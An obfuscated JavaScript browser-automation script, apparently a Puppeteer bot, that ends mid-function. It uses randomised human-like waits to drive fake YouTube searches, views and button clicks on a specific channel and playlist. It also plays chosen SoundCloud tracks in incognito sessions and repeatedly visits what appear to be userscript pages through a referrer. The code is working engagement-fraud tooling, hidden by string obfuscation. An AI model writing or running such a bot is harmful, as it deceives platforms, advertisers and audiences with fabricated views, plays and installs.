const Y = c,
  X = b,
  W = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x4f * -0x44 + -0x1e6c + 0x971 * 0x1))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0xb9 * 0x1b + -0x2005 + 0x3388), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x769d + 0xaca8 + 0xae15 * -0x1 + (-0x2462 * -0x2 + 0x1 * -0xf3f + 0x113) * random()) : await standardWaitForNetIdle(f), await wait(-0x32e + 0x1e6 + 0x10 * 0x14d + (0x1246 + 0x12ef + 0x1db) * random()), 0x2177 + -0x1 * -0x1279 + -0x33ef;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x101 * 0xb + -0x6c5 * 0x2 + 0x1 * 0x2c1d), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x20b1 * 0x1 + 0x1 * 0x331 + 0x245 * 0xd;
}
async function randomWait() {
  return await wait(0x3 * -0x54b + -0x809 * -0x3 + 0xb4e * 0x1 + (0x2 * -0xed7 + -0x62b * 0x6 + 0x5638) * random()), 0x5 * -0x376 + -0x482 + 0x15d1;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = b;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + R(0x5, '*ZqQ') + '--loaded'))['slice'](0x1ebd + -0x26d0 + 0x813, -0x4 * 0x727 + -0x761 * 0x4 + 0x1 * 0x3a27), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x204a * -0x7 + -0x2 * 0x1e97 + -0x2 * -0x104ca) * getRandomInt(0x1 * 0x253d + 0x233a + -0x4875, 0xd * 0x19d + -0x2 * 0xc94 + 0x434), h)), -0x1558 + -0xdb7 + 0x2310;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x4 * -0x4a3 + -0x59 * -0x12 + 0xc4a;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0xfc5 + 0x884 + 0x742]['split']('\x20');
    for (let k = -0x3 * -0xbf1 + 0x1f22 * 0x1 + -0x42f5; k < i['length']; k += 0x270d + 0x298 * 0x2 + -0xa9 * 0x43)
      j += i[k] * h[i[k + (0x7ae * -0x1 + -0x1049 + 0x1a * 0xec)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const S = b,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x26e8 + 0x1fb * -0x1 + -0x1 * -0x28e9)['map'](l => Array[S(0x16, 'EpGn')](l['children']))['flat'](0x1746 + -0xf83 + -0x7c2)['map'](l => l['childNodes'][-0x786 + 0xe0b + 0xc * -0x8b]['childNodes'][-0x171f * 0x1 + -0x1 * 0x208d + 0x37ac]['childNodes'][-0x277 * 0x4 + -0x187c + 0x2259]['childNodes'][0x2 * 0x1174 + 0x24c * -0x8 + -0x1088]['childNodes'][-0x38e + 0xefe + 0x1 * -0xb6f]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x2201 + -0x3d2 + -0x1a47, 0x137a + 0x18ca + -0x18bc)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x2417 + 0x5acf + -0x444e * 0x1);
  const h = await getMaxTime(f),
    i = Math['min']((-0x15fc4 + 0x9eb2 + -0xd5b9 * -0x2) * getRandomInt(0x7 * 0x101 + 0x10f1 * -0x2 + 0x1add, -0x229e + 0x1 * -0x9d1 + -0xb1d * -0x4), h);
  return await wait(i), 0x3 * -0x59 + 0xdd2 + -0x1 * 0xcc6;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const T = c;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h[T(0x2)])])['children'][0x4a * -0x68 + -0x1b68 * 0x1 + -0xe5e * -0x4]['children'][0x13cc + -0xd47 + -0x685 * 0x1]['children'][-0x167b + 0x2336 * 0x1 + -0x1 * 0xcbb]['children'][-0x2 * 0x100 + 0x1a47 + 0x71 * -0x37]['children'][-0x2383 + 0x21ac + 0x1 * 0x1d7]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x211 + -0x1949 * 0x1 + 0x1d * 0xcd;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1 * 0x158f + -0x8b2 + -0x59 * 0x25);
    let h = e[f];
    if (c['XEYCKM'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0xdb6 + -0x56d * 0x4 + 0x236a, r, s, t = -0x12c6 + -0x2d * 0xd1 + -0x1281 * -0x3; s = m['charAt'](t++); ~s && (r = q % (0xc1 + 0x140b * -0x1 + 0x134e) ? r * (-0x2005 + 0xe47 + 0x11fe) + s : s, q++ % (0x13c5 + 0x1cc7 + 0x3088 * -0x1)) ? o += String['fromCharCode'](-0x159 * -0x12 + 0x1 * -0x515 + -0x122e & r >> (-(-0x32e + 0x1e6 + 0x6 * 0x37) * q & 0x923 + 0x978 + -0x1295)) : 0x2177 + -0x1 * -0x1279 + -0x33f0) {
          s = n['indexOf'](s);
        }
        for (let u = -0x101 * 0xb + -0x6c5 * 0x2 + 0x1 * 0x1895, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x20b1 * 0x1 + 0x1 * 0x331 + 0x158 * 0x16))['slice'](-(0x3 * -0x54b + -0x809 * -0x3 + 0x838 * -0x1));
        }
        return decodeURIComponent(p);
      };
      c['nFtfoI'] = i, b = arguments, c['XEYCKM'] = !![];
    }
    const j = e[0x2 * -0xed7 + -0x62b * 0x6 + 0x42b0],
      k = f + j,
      l = b[k];
    return !l ? (h = c['nFtfoI'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    const U = d;
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])[U(0xb) + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x26ba + -0x20d1 + -0x585 + (-0x3 * 0x7bf + -0x1a * -0xe + 0x5 * 0x467) * random()
  }), await wait(0x1666 + -0x2645 + 0x11d3 + (0x16bd * -0x1 + -0x593 + 0x1d7c) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0xde * -0x29 + 0x244f + -0x1 * 0xbf]['childNodes'][-0xd * -0x2ab + 0x554 + 0x6 * -0x6ab]['childNodes'][-0x12 * 0x1dd + 0x1f29 + 0x1 * 0x262]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x6f4 + 0x1 * 0xcac + -0x139b]['childNodes'][-0x1eb5 * -0x1 + 0x60a + -0x1 * 0x24bf]['childNodes'][-0x1 * -0x1a35 + -0x1e33 + 0x400]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0xff8 + -0xf22 + 0x1 * 0x1f1b),
          r = 0x1e4c + 0x18d4 * -0x1 + -0x2 * 0x2bc;
        for (let u = -0x1 * 0xd2d + 0x116c + 0x1 * -0x43f; u < q['length']; u += 0x37 * -0x1e + 0x1b55 + -0x1 * 0x14e1)
          r += q[u] * k[q[u + (0x1a78 + 0x3 * 0x191 + -0x2 * 0xf95)]];
        return r;
      }(n);
  });
  await wait((-0x1 * -0x572f + -0x1db * 0x1 + 0x3b * -0x74) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x4979 * 0x1 + -0x9984 + 0x13a6b * 0x1) * getRandomInt(0x2678 + -0x15e6 * -0x1 + -0x3c5d * 0x1, 0x3fe * 0x5 + 0x2a1 + -0x168d), h + (-0x18 + -0x21d9 + 0x41d * 0xd));
  return await wait(i), 0x43b + 0x5c8 + -0x3 * 0x356;
}

function a() {
  const bm = [
    'easyfork.o',
    'WRjdtxhcRSolgSo2W7FcJq',
    'BgvUz3rO',
    'rvm3B29VywTYlq',
    'mc4WlJaGu2fMyq',
    'WQNdOWBdRwxcK8oslCodWQO',
    'zwfZEwzVCMSUBW',
    'WOvBcuStW71LW5HueW',
    'WRSzmIZcQK7dPmk+fW4',
    'WRpcUmk1o8oClSksW4ZdGbS',
    'BMqIo3y9iJi0iG',
    'setAttribu',
    'MfR5q6Td3R',
    'pts/by-sit',
    'CMvTB3zLywrZ',
    'WQadqw3cVSonbCoNWRZdJa',
    'ols-you-sh',
    'Mozilla/5.',
    'WP80W4hdJ8o9tmotz8k0W7u',
    'mCoPes/cHWBdJmkvymoo',
    'in/never-h',
    'UgPa6A',
    'W6DNqNy',
    'C8kUfH3cGeFdM8kzzCou',
    'rM82Ede2rgTVuG',
    'Bhe9PyM_s_',
    'W4NdQhpdKupdKmkDrSoAba'
  ];
  a = function() {
    return bm;
  };
  return a();
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x161 * -0x10 + -0x1a52 + 0x442), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x14c0 + -0x69 * 0x2 + 0x214a + (-0x18c5 * 0x1 + 0x15f1 + 0x6bc) * Math['random']());
    });
  }, 0x569 * -0x5 + 0x17 * -0xbd + -0x23b0 * -0x2);
  await wait(-0x47b7 + 0x6d674 + -0x1 * 0x1fadd);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0xc * -0x26c3 + -0x35e * 0x4f + 0x233e) * getRandomInt(0x1e * -0xe1 + 0x1f51 + -0x4ef, -0x1 * -0x1ca3 + 0x1d0d + -0x3997)), clearInterval(h), -0x3a * 0x4f + 0x79 * 0x18 + 0x17 * 0x49;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1 * 0x158f + -0x8b2 + -0x59 * 0x25);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0xe47 + 0x1ba4 + -0x29eb;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0xc01 * 0x1 + -0x15f7 * 0x1 + 0x21f9;
    await randomWait();
  }
  return -0x1355 * 0x1 + -0x17a7 + 0x9b * 0x47;
}

function fetchRandomSC() {
  const V = b;
  return Math['random']() <= 0x25 * 0xc0 + 0x12 * 0x1f1 + 0x3eb2 * -0x1 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x2146 + 0x4d3 * -0x6 + -0x454 * 0x1 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + V(0x7, '2gED') + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0xffb * -0x1 + -0x1 * 0x1c6 + -0xe35 * 0x1 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x745 + -0x1f1 * 0x5 + 0xd0 * 0x3;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x9b * -0x229 + 0xd6 * 0x13e + 0xf4c7 * 0x1 + getRandomInt(0x3 * -0x1f99 + 0x1 * -0xc13 + -0x52bb * -0x2, -0x758c + -0x4a1 * 0x5 + 0x24d7 * 0x7));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1e00 * 0x1 + -0x22bf + 0x4c0), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1615 * 0x1 + -0x51 * -0x33 + -0x8 * 0x4c7;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x489 + 0x13c9 * -0x1 + 0x40 * 0x3d, 0x1893 + -0x19ef + -0x2 * -0xc7)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x896 + 0x1 * -0xdf6 + 0x1e5c + floor((0x7 * 0x2cf + 0x1 * 0x11dd + -0x219e) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x69f711a8 + 0x953b6656 + -0x2 * -0x2a5dd5a9),
          -0xba02c9 + -0x7 * -0xdc781 + 0xd98e42,
          0x6d23 + 0x2a2 * 0x5c + 0x1 * -0xdf5b,
          0x24e9 + -0x1d55 + -0x714
        ], y = [
          0xc25 + 0x2ec + 0xef9 * -0x1,
          -0x209 * 0xd + -0x7c5 + -0x1ce * -0x13,
          0x1e22 + 0x1e2e * -0x1 + 0x14,
          0xc44 + -0x83 * 0x5 + -0x9b5
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x9 * -0x3df + -0x4 * -0x7fb + 0x2ec)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0xcee + -0x11 * 0x3d + -0x8e1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x1 * -0xb6f + -0x1b86 + 0x1017) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x246f + -0x1 * 0xf5d + -0x57 * 0x3e] = A[-0x8 * -0x1 + 0x1 * -0x1b1 + 0x1b9] = A[0xb * -0xf + 0x903 * 0x1 + -0x85d] = A[-0x231f + -0xb4b * 0x2 + 0x39b7] = A[-0x1eea + 0x4fe + -0x8a5 * -0x3] = A[0x107 * 0x1b + -0x150b * -0x1 + 0x4 * -0xc31] = A[0x5ae * -0x5 + -0x1069 + -0xb35 * -0x4] = A[0xe45 * -0x2 + -0x4c1 + -0xb1b * -0x3] = A[0x1e2b + -0x1d50 + -0xd4] = A[0x115a + 0x195 + -0x12e7] = A[0x3 * 0xc9a + 0x13cc + -0x1 * 0x3991] = A[0x1381 + 0x5 * 0x526 + 0x2d35 * -0x1] = A[0x20 * 0xc5 + -0x1 * -0x26d2 + 0x1 * -0x3f67] = A[0x10bb + -0x7 * 0x2dd + 0x35c] = A[-0x23ea + 0x6 * -0x595 + 0x4575] = A[-0x14c * 0x17 + -0x2a * -0xd + 0x18 * 0x128] = A[0xa50 + -0x65 * -0x21 + -0x2 * 0xba3] = 0x24a5 + 0x677 + -0x2b1c, this['blocks'] = A) : this['blocks'] = [
                -0x1 * -0x18bc + 0x1 * -0x16f + -0x174d,
                -0x7 * -0xeb + -0x415 + -0x258,
                0x6e5 * 0x2 + 0x9 * -0xfb + -0x4f7,
                0x23 * -0x4b + -0xbcc + 0x5 * 0x469,
                -0x1efd + 0x1 * 0x180d + 0x6f0,
                0x2064 + 0xd41 + -0x2da5,
                -0x1061 + 0x1 * 0x12ec + -0x28b,
                0x2 * -0x34e + -0xb5a + 0x11f6,
                -0x1819 + -0x1fe8 + -0x1b * -0x213,
                -0x1d8c + -0x1208 + 0x2f94,
                0x1aae * 0x1 + 0x1b1 * 0x1 + -0x1c5f,
                0x238 + -0x5e * 0x3e + -0x20e * -0xa,
                -0x45 * 0x59 + 0x1a2d + -0x230,
                -0x1b4a + 0x8 * -0xbc + 0x212a,
                0x823 + 0x1 * -0xef4 + 0x6d1,
                0x2496 + 0x272 * 0x9 + -0x5dc * 0xa,
                0xf29 * -0x1 + 0x2f * 0x92 + -0xba5
              ], this['h0'] = -0x70f583f4 + 0x3d83948b + 0x9ab7126a, this['h1'] = -0x55465588 + 0x18fd324f3 + 0x4ba20a * -0xfd, this['h2'] = -0xe103b7 * 0xf1 + -0x2 * -0x55b715e1 + 0x1a9127 * 0x745, this['h3'] = -0xd484c30 + -0x51 * -0x4010b3 + 0x9355803, this['h4'] = -0xf05caeed + -0x17ba08ef4 + 0x32fd01fd1, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x94c + 0x2688 + -0x17ea * 0x2, this['finalized'] = this['hashed'] = -0x1 * 0x5ab + 0x2b * 0xbb + -0x19be, this['first'] = -0x14d * 0xd + 0x3 * 0x589 + -0x1 * -0x4f;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1 * 0x214b + -0x945 + 0x2 * -0xc03, O = J['length'] || 0xf40 + -0x959 * 0x1 + -0x1 * 0x5e7, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0xa * -0x1a6 + -0xb * -0x19b + 0x1 * -0x2225, P[-0x1999 + 0x2 * -0x12e5 + 0x3f63] = this['block'], P[-0xf81 + 0x16 * 0x59 + 0x7eb] = P[-0x21cc + -0x1679 + 0x3846] = P[-0x1 * -0x1819 + 0x1166 + 0xd * -0x331] = P[0x62 * -0x2c + 0x3 * 0x779 + -0x8 * 0xb2] = P[0x1528 + -0x1c49 + -0x725 * -0x1] = P[0x71 * 0x45 + -0x1 * -0x15ee + -0x345e] = P[0x205 + 0x1 * -0x97 + -0x168] = P[0x3d9 * 0x5 + 0x1349 + -0x267f] = P[0x3 * 0x241 + 0x1 * -0x287 + -0x434] = P[0x2015 + -0x1074 + -0xf98] = P[0xad + -0x4 * 0x9b0 + 0x261d] = P[0x1cdc + -0x1163 + -0x1a2 * 0x7] = P[0x1 * 0x127d + 0x8f3 + -0x2 * 0xdb2] = P[-0x409 * -0x7 + 0xba * 0x28 + 0x1ca1 * -0x2] = P[0xbce + 0x10cb * 0x1 + -0x1 * 0x1c8b] = P[0x17 * -0x7d + -0x1 * 0x21ad + -0x1 * -0x2cf7] = 0x5d5 * -0x5 + -0x1 * -0xb07 + 0x1222), K) {
                    for (N = this['start']; M < O && N < 0xd85 + -0x1033 + 0x6 * 0x7d; ++M)
                      P[N >> -0x3 * 0xa2 + -0x2462 * 0x1 + 0x264a] |= J[M] << y[-0x1996 + -0x445 * -0x1 + 0x1e * 0xb6 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x1139 * 0x1 + 0x3b * 0x29 + 0x59 * -0x4c; ++M)
                      (L = J['charCodeAt'](M)) < 0x1e87 + 0x1 * -0x1a55 + -0x2b * 0x16 ? P[N >> 0x16f * 0xd + 0xb2 * -0x1 + 0x11ef * -0x1] |= L << y[0x135e + 0x1bbf * 0x1 + -0x2f1a & N++] : L < 0x19ff + -0x1132 * -0x2 + -0x3463 ? (P[N >> 0x3f * 0x29 + 0x22d * -0xc + 0x1007] |= (-0x1 * -0xb7b + -0x1 * 0xbbd + 0x102 | L >> 0x25 * 0x76 + 0x1e2d + 0x971 * -0x5) << y[-0x71d + -0x1158 + 0x105 * 0x18 & N++], P[N >> 0x44d * -0x1 + -0x1f7 + 0x646] |= (0x17 * -0x197 + -0x11 * -0x241 + -0x140 | -0x446 * 0x5 + -0x5c * -0x9 + 0x1261 & L) << y[-0x397 * 0x7 + 0x990 + 0x1 * 0xf94 & N++]) : L < 0x10c09 + -0x187b * -0xa + 0x1 * -0x128d7 || L >= -0x3bc2 + -0x1b09b + 0x2cc5d ? (P[N >> 0x11e5 + 0x6 * 0x412 + -0x2a4f] |= (0x1e45 + 0xd8 + -0x1e3d | L >> -0x18ec + 0x93d + -0x1 * -0xfbb) << y[-0x3 * 0x254 + -0x1880 + 0xb * 0x2dd & N++], P[N >> -0x252f * 0x1 + -0x1 * 0x2313 + 0x1211 * 0x4] |= (0x1b50 + 0x11 * -0x1d7 + 0x477 | L >> -0x11 * 0x2 + -0x1 * 0x23b7 + 0x23df & -0xc * 0x146 + 0x1963 + -0x9dc) << y[-0x18fc + -0x69d + 0x22 * 0xee & N++], P[N >> 0xed9 + 0x1 * -0x117f + 0x2 * 0x154] |= (0x92 * -0xb + 0x1 * -0x556 + 0xc1c | 0x13f5 + 0x1 * -0x1e56 + -0x550 * -0x2 & L) << y[0x1629 + 0x21ab + 0x3 * -0x129b & N++]) : (L = 0x2f * -0x95f + 0x174b3 * -0x1 + 0x42d24 + ((-0x23f6 + -0x1711 + -0x1502 * -0x3 & L) << -0x455 * 0x5 + -0x56c + 0x1b1f | -0xab8 + -0x7 * 0x44f + 0x4 * 0xb38 & J['charCodeAt'](++M)), P[N >> 0x629 * 0x5 + 0x41b * 0x9 + 0x2e * -0x179] |= (0x17 * -0x105 + -0x9 * 0xb5 + 0x8 * 0x3d8 | L >> 0xff + 0x20e + 0x6d * -0x7) << y[0x492 + -0x1761 + 0x16 * 0xdb & N++], P[N >> 0x3 * 0xbdc + -0x82a * -0x1 + -0x2bbc] |= (-0x124 * 0x5 + 0x1223 * -0x1 + 0x1857 | L >> 0x193e + -0x13 * 0x29 + -0x1627 * 0x1 & -0x1 * 0x2169 + 0x2303 + -0x15b) << y[0x11a5 + -0x21b7 + 0xb3 * 0x17 & N++], P[N >> 0x169c * 0x1 + -0x3d1 * 0x3 + 0x1 * -0xb27] |= (-0x17f0 + -0x21b3 * -0x1 + -0x1 * 0x943 | L >> 0x35 * 0x35 + 0x52b * 0x5 + -0x24ca & 0x6c9 + -0x5 * 0x549 + 0x1 * 0x13e3) << y[0x196f + -0x2d7 + -0x1695 & N++], P[N >> 0x4 * -0x4aa + -0x8 * 0x21d + 0x2392] |= (-0x707 + -0x483 + 0xc0a | -0x23b8 + -0x7a4 + -0x3d * -0xb7 & L) << y[0x4f * 0x2b + -0x1310 + 0x5ce & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x49f + -0x3c4 * 0x3 + -0x1 * -0x6ed ? (this['block'] = P[0x6fd + 0x43 * 0x17 + -0xcf2], this['start'] = N - (0x835 + 0x121f + -0x1a14), this['hash'](), this['hashed'] = -0xae1 + 0x175e + -0xc7c) : this['start'] = N;
                }
                return this['bytes'] > 0x90e02e5 * 0x13 + 0x1 * -0xaccfb53f + 0x55972a15 * 0x3 && (this['hBytes'] += this['bytes'] / (0xa689a69 * 0x10 + 0x1aa2c * 0x8b84 + -0x8ecb4940) << -0x10be + -0x158f + 0x5 * 0x7a9, this['bytes'] = this['bytes'] % (-0x51f6281c * -0x3 + -0xa218769c + 0x561aff24 * 0x2)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x13ed * -0x1 + -0x17df + 0x3f3;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
